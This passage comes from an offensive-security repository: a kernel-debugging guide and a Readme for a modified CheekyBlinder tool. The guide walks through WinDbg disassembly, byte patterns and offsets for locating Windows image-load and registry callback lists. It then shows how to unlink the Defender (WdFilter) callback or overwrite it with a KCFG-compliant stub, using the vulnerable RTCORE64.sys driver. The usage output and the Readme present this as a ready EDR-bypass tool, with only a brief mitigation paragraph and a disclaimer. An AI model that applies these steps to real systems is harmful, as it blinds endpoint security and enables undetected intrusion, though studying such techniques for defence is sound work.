fffff800`a4e5c980 4883ec20        sub     rsp,20h
fffff800`a4e5c984 488be9          mov     rbp,rcx
fffff800`a4e5c987 48f7c2feffffff  test    rdx,0FFFFFFFFFFFFFFFEh
fffff800`a4e5c98e 7569            jne     nt!PsSetLoadImageNotifyRoutineEx+0x89 (fffff800`a4e5c9f9)
fffff800`a4e5c990 e81b010000      call    nt!ExAllocateCallBack (fffff800`a4e5cab0)
fffff800`a4e5c995 33db            xor     ebx,ebx
fffff800`a4e5c997 488bf0          mov     rsi,rax
fffff800`a4e5c99a 4885c0          test    rax,rax
fffff800`a4e5c99d 7476            je      nt!PsSetLoadImageNotifyRoutineEx+0xa5 (fffff800`a4e5ca15)
fffff800`a4e5c99f 8bfb            mov     edi,ebx
fffff800`a4e5c9a1 83ff40          cmp     edi,40h
fffff800`a4e5c9a4 7365            jae     nt!PsSetLoadImageNotifyRoutineEx+0x9b (fffff800`a4e5ca0b)
fffff800`a4e5c9a6 8bc7            mov     eax,edi
<mark>fffff800`a4e5c9a8 488d0dd17c4a00  lea     rcx,[nt!PspLoadImageNotifyRoutine (fffff800`a5304680)]
fffff800`a4e5c9af 4533c0          xor     r8d,r8d
fffff800`a4e5c9b2 488bd6          mov     rdx,rsi
fffff800`a4e5c9b5 488d0cc1        lea     rcx,[rcx+rax*8]</mark>
</pre>

same as the others, we need to make sure the bytes are correct `0x8d48d68b48c03345` and the offset is still the same `0x04` and find 2 functions close to `nt!PsSetLoadImageNotifyRoutineEx` for the byte search.

<pre>
lkd> dq fffff800`a4e5c9af L1
fffff800`a4e5c9af 8d48d68b`48c03345
</pre>

<pre>
lkd> ? nt!PsSetLoadImageNotifyRoutineEx - nt
Evaluate expression: 10865008 = 00000000`00a5c970
</pre>

![Export Table 2](./screenshots/ExportTableImage.png)

Based on the screenshot the function `PsSetLoadImageNotifyRoutineEx` is exported and we can use it directly, it wasn't always the case between windows versions. so i will still use `RtlAppendStringToString` as start and `IoInitializeMiniCompletionPacket` as end.

## Registry Callback

For the registry callback its a little bit different where all the callback functions are saved inside a linked list called `nt!CallbackListHead`.

First we need to to find out a function that uses `nt!CallbackListHead` and ideally an exported function to use it in our byte search.

First let's calculate the offset of `nt!CallbackListHead` from the nt base

<pre>
lkd> ? nt!CallbackListHead - nt
Evaluate expression: 15691152 = 00000000`00ef6d90
</pre>

Then in IDA, lets go to that address by going to `Jump => Jump to Address` and use `00ef6d90`

![Jump To Address](./screenshots/JumpToAddress.png)

Now we can hover our mouse on `CallbackListHead` => click on it => and then press x for cross reference which will tell us who is actually using that list.

![Cross Reference](./screenshots/crossReference.png)

And luckily the first function `CmUnRegisterCallback` is also an exported function, so we can use the following functions as start and end for our search.

![Export Table 3](./screenshots/ExportTableRegistry.png)

<pre>
nt!CmUnRegisterCallback+0x58:
<mark>fffff800`a4baeaa8 488d0de1827400  lea     rcx,[nt!CallbackListHead (fffff800`a52f6d90)]</mark>
fffff800`a4baeaaf e85cd03c00      call    nt!CmListGetNextElement (fffff800`a4f7bb10)
<mark>fffff800`a4baeab4 488bf8          mov     rdi,rax
fffff800`a4baeab7 4889442440      mov     qword ptr [rsp+40h],rax
fffff800`a4baeabc 4885c0          test    rax,rax</mark>
fffff800`a4baeabf 0f848d000000    je      nt!CmUnRegisterCallback+0x102 (fffff800`a4baeb52)
fffff800`a4baeac5 48395818        cmp     qword ptr [rax+18h],rbx
fffff800`a4baeac9 75d5            jne     nt!CmUnRegisterCallback+0x50 (fffff800`a4baeaa0)
</pre>

The bytes will be `0x4024448948f88b48` and we need to substract `0x09` to get to the relative offset address of the callback array which is `007482e1` and read it.

<pre>
lkd> dq fffff800`a4baeabc L1
fffff800`a4baeabc  40244489`48f88b48
</pre>

`nt!CallbackListHead` is a linked list where each entry at offset 0x28 is the function being called.

<pre>
lkd> dqs nt!CallbackListHead L2
fffff800`a52f6d90  ffffd182`c338ff70
fffff800`a52f6d98  ffffd182`c7f74850
lkd> dqs ffffd182`c338ff70 L2
ffffd182`c338ff70  ffffd182`c37c2d30
ffffd182`c338ff78  fffff800`a52f6d90 nt!CallbackListHead
</pre>

It only contains one entry, let's check what's at offset 0x28 of that entry

<pre>
lkd> dqs nt!CallbackListHead L2
fffff800`a52f6d90  ffffd182`c338ff70
fffff800`a52f6d98  ffffd182`c7f74850
lkd> dqs ffffd182`c338ff70 L2
ffffd182`c338ff70  ffffd182`c37c2d30
ffffd182`c338ff78  fffff800`a52f6d90 nt!CallbackListHead
lkd> dqs ffffd182`c338ff70 L6
ffffd182`c338ff70  ffffd182`c37c2d30
ffffd182`c338ff78  fffff800`a52f6d90 nt!CallbackListHead
ffffd182`c338ff80  00000000`00000000
ffffd182`c338ff88  01db94d7`cec0b740
ffffd182`c338ff90  00000000`00000000
<mark>ffffd182`c338ff98  fffff800`37f98000 WdFilter+0x28000</mark>
</pre>

We have 2 options to bypass this:

1- Removing the whole link from the linked list => delinking

2- Overwriting the function at offset 0x28 with a KCFG compliant function that just returns rendering the link useless.

## Mitigation
Defenders should not allow any new driver to be loaded onto a system, regardless of whether it is signed or not. If a user requires a driver, it must be reviewed and approved by IT. Security teams should configure their EDR or AV platforms to block any new driver from being loaded unless explicitly approved.

## Usage
<pre>
C:\Users\Vixx\Desktop\Tools\PEN-300\EDR Kernel Bypasses\CheekyBlinder-solution\x64\Release>CheekyBlinder.exe
Usage: CheekyBlinder.exe
 /proc - List Process Creation Callbacks
 /delproc <address> - Remove Process Creation Callback
 /delprocstealth <address> - overwriting the Process Creation function Callback
 /thread - List Thread Creation Callbacks
 /delthread - Remove Thread Creation Callback
 /installDriver - Install the MSI driver
 /uninstallDriver - Uninstall the MSI driver
 /img - List Image Load Callbacks
 /delimg <address> - Remove Image Load Callback
 /reg - List Registry modification callbacks
 /delreg <address> - Remove Registry callback
 /unlinkreg <address> - Remove Registry linked list callback
 </pre>

What's new from the original exploit:

`/unlinkreg` which will delink the callback entry in the linked list.

`/delreg` is now working which will overwrite the callback function in the callback list entry with a kcfg compliant function that does nothing.

`/delprocstealth`  overwriting the Process Creation function Callback with a kcfg compliant function that does nothing.

while we can use the same stealth method for the `img` and `thread` as well, I only did it for the process creation callback and the registry callback.

`RTCORE64.sys` needs to be on the same folder where your exe is.

## Reference
https://br-sn.github.io/Removing-Kernel-Callbacks-Using-Signed-Drivers/

### Disclaimer
This project is for **educational purposes only**. Unauthorized use of this tool in production or against systems without explicit permission is strictly prohibited.

```

`Readme.md`:

```md
# Kernel Callbacks Removal (Bypassing EDR Detections)

## Warning
Even though you can download the binaries from the `releases`, you have to make sure that the offsets and the binary search opcodes done is the same on your windows version or you will get a **BLUE SCREEN OF DEATH**

## Offsets and Patterns Modification
All offsets and patterns that needs to be modified based on your windows version can be found in the file ending with `Util.h` within each project.

Following the guide inside the folder will help you figure it out how to retrieve the opcodes and offsets.

<b> Each subsection contains a readme with instructions </b>

## New Undisclosed Technique 
I discovered an alternative method that bypasses kernel-level verification by overwriting the callback function inside the Callback entry itself with a KCFG-compliant function that simply returns. This evades detections that monitor changes at the callback array level `(For Kernel Notify Routines Callbacks)`.

## Prerequisistes

This is an advanced topic requiring the following prerequisites:

- Assembly understanding

- Familiarity with C programming

- Experience with WinDbg

- Familiarity with IDA

- Windows kernel exploitation knowledge

## Tools Used

WinDbg: [Windows Debugging Tools](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/)

IDA: [Hex-Rays IDA Free](https://hex-rays.com/ida-free)

## Kernel Debugging Setup

To debug your local kernel (for fixing your offsets and reversing), follow the instructions here: [Setting up local kernel debugging](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/setting-up-local-kernel-debugging-of-a-single-computer-manually)

## Target Audience

This project is for both pentesters and defenders to understand how attackers can bypass EDR kernel implementations.

## Purpose

- For everyone to be able to learn how technically bypassing EDR is done.
- For having the flexibility to create your own tool which make it pretty easier to bypass signature based detection.
- For researchers to be able to play around the code and debug and reverse.

## Techniques Covered

- Kernel Notify Routines Callback Bypass
- MiniFilter File Callback Bypass
- Network Callout Callback Bypass
- ETW-TI Kernel Bypass

## Tested on
Host Name:                     WIN11

OS Name:                       Microsoft Windows 11 Pro

OS Version:                    10.0.26100 N/A Build 26100

### Disclaimer
This project is for **educational purposes only**. Unauthorized use of this tool in production or against systems without explicit permission is strictly prohibited.

```